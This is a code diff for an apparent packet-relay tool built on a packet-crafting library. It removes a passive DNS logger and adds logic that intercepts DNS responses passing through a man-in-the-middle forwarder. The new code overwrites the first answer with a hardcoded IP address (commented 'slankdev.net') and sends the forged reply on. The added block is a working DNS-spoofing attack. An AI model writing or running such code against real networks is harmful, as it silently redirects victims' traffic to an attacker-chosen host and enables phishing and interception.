@@ -45,21 +45,13 @@ bool other_packet_filter(const u_char* packet, int len);
 
 
 
-void filter(const u_char* packet, int len){
-	pgen_unknown buf(packet, len);
-
-	if(!(buf.isUDP && buf.portis(53))) return;
-	
-	pgen_dns dns(packet, len);
-	dns.summary();
-}
-
-
 
 bool myswitch(const u_char* packet, int len){
-	if(other_packet_filter(packet, len) == false) return true;
 	
-	filter(packet, len);
+	// slankdev.net 
+	bit8 _s_data[] = {157, 7, 72, 229};
+
+	if(other_packet_filter(packet, len) == false) return true;
 
 	macaddr next_src;
 	macaddr next_dst;
@@ -71,11 +63,23 @@ bool myswitch(const u_char* packet, int len){
 	ip.ETH.src = next_src;
 	ip.ETH.dst = next_dst;
 
-	
+	ip.compile();
+	pgen_unknown buf(ip.data, len);
 
-	ip.send_handle(handle);	
+	if(buf.isUDP){
+		if(buf.portis(53)){
+			pgen_dns dns(ip.data, len);
+			if(dns.DNS.flags.qr == 1){
+				memcpy(dns.DNS.answer[0].data, _s_data, 4);
+				dns.summary();
+				
+				dns.send_handle(handle);
+				return true;
+			}
+		}
+	}
 
-	
+	ip.send_handle(handle);
 	return true;
 }
 
